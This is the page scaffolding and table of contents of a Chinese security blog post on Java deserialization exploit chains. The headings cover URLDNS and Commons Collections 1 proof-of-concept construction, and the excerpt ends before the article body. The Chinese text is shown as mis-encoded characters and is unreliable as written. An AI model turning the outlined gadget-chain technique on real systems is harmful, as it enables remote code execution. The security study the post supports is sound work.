<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Leihehe"><meta name="copyright" content="Leihehe"><meta name="generator" content="Hexo 6.0.0"><meta name="theme" content="hexo-theme-yun"><title>Javaååºåˆ—åŒ–æ¼æ´ä¹‹åˆ©ç”¨é“¾åˆ†æé›†åˆ(4) | LeiH - Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-okaidia.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" type="image/png" href="/logo.png"><link rel="mask-icon" href="/logo.png" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="preload" href="/js/prism.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"leihehe.top","root":"/","title":["LeiH's","Blog"],"version":"1.7.0","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><script src="/js/prism.js"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap"><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta name="description" content="å‰è¨€åœ¨ææ¸…æ¥šJavaåå°„æœºåˆ¶ã€RMIå’ŒåŸºæœ¬çš„Javaååºåˆ—åŒ–æ¼æ´æµç¨‹åï¼Œä¸‹ä¸€æ­¥ä¾¿æ˜¯åˆ†æJavaååºåˆ—åŒ–æ¼æ´çš„ç»å…¸åˆ©ç”¨é“¾äº†ã€‚ä½†è¿™å¯¹å¤§éƒ¨åˆ†äººæ¥è¯´éƒ½å¹¶ä¸å®¹æ˜“ï¼Œæˆ‘åœ¨ç½‘ä¸ŠæŸ¥é˜…äº†å¤§é‡èµ„æ–™ï¼Œå¤§éƒ¨åˆ†æ–‡ç« å¯¹äºæ–°æ‰‹æ¥è¯´å¹¶ä¸å‹å¥½ - åˆšå¼€å§‹æˆ‘ç”šè‡³æä¸æ¸…æ¥šæµ‹è¯•ååºåˆ—åŒ–æ¼æ´çš„ç¯å¢ƒåº”è¯¥å¦‚ä½•æ­å»ºï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåˆä½•è°ˆåˆ†æä»£ç ã€‚ è¿™ç¯‡å°†é›†åˆæ‰€æœ‰ç»å…¸çš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨é“¾çš„è¯¦ç»†è®²è§£ï¼ˆåŒ…æ‹¬ä¸€äº›ç¯å¢ƒæ­å»ºï¼‰ï¼Œå¸Œæœ›å¸®åŠ©æ›´å¤šäººã€ä¹ŸåŒ…æ‹¬æˆ‘è‡ªå·±ï¼Œ">
<meta property="og:type" content="article">
<meta property="og:title" content="Javaååºåˆ—åŒ–æ¼æ´ä¹‹åˆ©ç”¨é“¾åˆ†æé›†åˆ(4)">
<meta property="og:url" content="https://leihehe.top/2021/07/31/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E9%9B%86%E5%90%88-4/index.html">
<meta property="og:site_name" content="LeiH - Blog">
<meta property="og:description" content="å‰è¨€åœ¨ææ¸…æ¥šJavaåå°„æœºåˆ¶ã€RMIå’ŒåŸºæœ¬çš„Javaååºåˆ—åŒ–æ¼æ´æµç¨‹åï¼Œä¸‹ä¸€æ­¥ä¾¿æ˜¯åˆ†æJavaååºåˆ—åŒ–æ¼æ´çš„ç»å…¸åˆ©ç”¨é“¾äº†ã€‚ä½†è¿™å¯¹å¤§éƒ¨åˆ†äººæ¥è¯´éƒ½å¹¶ä¸å®¹æ˜“ï¼Œæˆ‘åœ¨ç½‘ä¸ŠæŸ¥é˜…äº†å¤§é‡èµ„æ–™ï¼Œå¤§éƒ¨åˆ†æ–‡ç« å¯¹äºæ–°æ‰‹æ¥è¯´å¹¶ä¸å‹å¥½ - åˆšå¼€å§‹æˆ‘ç”šè‡³æä¸æ¸…æ¥šæµ‹è¯•ååºåˆ—åŒ–æ¼æ´çš„ç¯å¢ƒåº”è¯¥å¦‚ä½•æ­å»ºï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåˆä½•è°ˆåˆ†æä»£ç ã€‚ è¿™ç¯‡å°†é›†åˆæ‰€æœ‰ç»å…¸çš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨é“¾çš„è¯¦ç»†è®²è§£ï¼ˆåŒ…æ‹¬ä¸€äº›ç¯å¢ƒæ­å»ºï¼‰ï¼Œå¸Œæœ›å¸®åŠ©æ›´å¤šäººã€ä¹ŸåŒ…æ‹¬æˆ‘è‡ªå·±ï¼Œ">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731154615757.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731154659615.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731160311855.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731192120814.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731202443280.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731222403673.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731222703200.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731223154142.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731225703306.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731225956030.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731220804329.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731231645279.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731232549977.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210805215256433.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210805215440540.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210805215558587.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210806093126421.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210806095753374.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210806095846949.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211126190531654.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211126190648753.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211126191106461.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211126223902264.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127154940678.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127214801875.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127161222841.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127212356132.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127212511457.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127215336783.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211128194719960.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211128195530245.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211202153617378.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211128234002277.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211129123207018.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/2.gif">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211129124841260.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211130200257918.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211201110012791.png">
<meta property="og:image" content="https://leihehe.top/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E9%9B%86%E5%90%88-4/image-20211201153006916.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211201161957159.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211201162910487.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204145232237.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204145642205.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204162857604.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204183033871.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204183536474.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204184034975.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211205094232431.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206194914358.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206200746114.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206201003311.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206205356150.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206210624980.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206210904041.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102151143793.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102151651096.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102152313976.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102152422839.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102154928181.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102155548083.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102162535035.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102165724308.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220102172023830.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211212231734543.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211212234937446.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213001727380.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211212233501619.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211212233854484.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211213001956198.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223132310175.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223151852743.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223152235321.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223152603584.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223152643912.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223153240686.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223154957970.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163019109.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163224292.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163334597.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163615319.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223163755978.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165224129.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165446209.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165804156.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165926366.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223165955572.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223232137157.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223233932961.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223234007242.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223232837239.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211223232449924.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108105129564.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108111958984.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108112115321.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108112140316.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108112247858.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108112504772.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108204218773.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108204615107.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108205558062.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108210443480.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108210555536.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164249197.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164603987.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164636943.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164727601.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164746325.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108164924577.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108172115011.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108173137665.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108174017479.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108174039274.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220108201834255.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211127161222841.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109150412316.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109150849934.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109150954388.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109214228148.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109214347945.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109221758660.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109214959269.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109231952820.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109233459957.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109233742373.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109235030406.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109235105137.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220109235132417.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220110124835115.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220110134359041.png">
<meta property="og:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20220110134617419.png">
<meta property="article:published_time" content="2021-07-31T05:20:20.000Z">
<meta property="article:modified_time" content="2022-06-08T23:43:07.128Z">
<meta property="article:author" content="Leihehe">
<meta property="article:tag" content="Web Security">
<meta property="article:tag" content="Javaååºåˆ—åŒ–">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731154615757.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info mickey-mouse"><a class="site-author-avatar" href="/about/" title="Leihehe"><img width="96" loading="lazy" src="/image/avatar.png" alt="Leihehe"><span class="site-author-status" title="å­¦ä¹ å­¦ä¹ å†å­¦ä¹ åŠªåŠ›åŠªåŠ›å†åŠªåŠ›">ğŸ˜Š</span></a><div class="site-author-name"><a href="/about/">Leihehe</a></div><span class="site-name">LeiH - Blog</span><sub class="site-subtitle"></sub><div class="site-desciption">æˆ‘è¯¥è¯´äº›ä»€ä¹ˆå‘¢ï¼Ÿ</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="My Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/about/"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span></a></div><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">46</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">20</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">26</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="ç•™è¨€æ¿"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-clipboard-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/leihehehe" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:hslscarlett@gmail.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="å‹æƒ…é“¾æ¥" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#URLDNS%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">URLDNSåˆ©ç”¨é“¾</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Apache-Commons-Collections-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">Apache Commons Collections åˆ©ç”¨é“¾</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFCommons-Collections"><span class="toc-number">3.1.</span> <span class="toc-text">ä»€ä¹ˆæ˜¯Commons Collections</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-Collections-1"><span class="toc-number">3.2.</span> <span class="toc-text">Commons Collections 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.2.1.</span> <span class="toc-text">ç¯å¢ƒæ­å»º</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%87%86%E5%A4%87"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">ä¸‹è½½å‡†å¤‡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E5%BA%93"><span class="toc-number">3.2.1.2.</span> <span class="toc-text">å¯¼å…¥åº“</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-number">3.2.1.2.1.</span> <span class="toc-text">ç¬¬ä¸€ç§æ–¹æ³•</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-number">3.2.1.2.2.</span> <span class="toc-text">ç¬¬äºŒç§æ–¹æ³•</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TransformedMap%E7%89%88%E6%9C%AC-POC%E6%9E%84%E9%80%A0%E8%BF%87%E7%A8%8B"><span class="toc-number">3.2.2.</span> <span class="toc-text">TransformedMapç‰ˆæœ¬ - POCæ„é€ è¿‡ç¨‹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Intro"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9AInvokerTransformer"><span class="toc-number">3.2.2.2.</span> <span class="toc-text">ç¬¬ä¸€æ­¥ï¼šInvokerTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9AChainedTransformer"><span class="toc-number">3.2.2.3.</span> <span class="toc-text">ç¬¬äºŒæ­¥ï¼šChainedTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9AConstantTransformer"><span class="toc-number">3.2.2.4.</span> <span class="toc-text">ç¬¬ä¸‰æ­¥ï¼šConstantTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9ATransformedMap-put"><span class="toc-number">3.2.2.5.</span> <span class="toc-text">ç¬¬å››æ­¥ï¼šTransformedMap - put()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9ATransformedMap-checkSetValue"><span class="toc-number">3.2.2.6.</span> <span class="toc-text">ç¬¬äº”æ­¥ï¼šTransformedMap - checkSetValue()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A-AnnotationInvocationHandler"><span class="toc-number">3.2.2.7.</span> <span class="toc-text">ç¬¬å…­æ­¥ï¼š 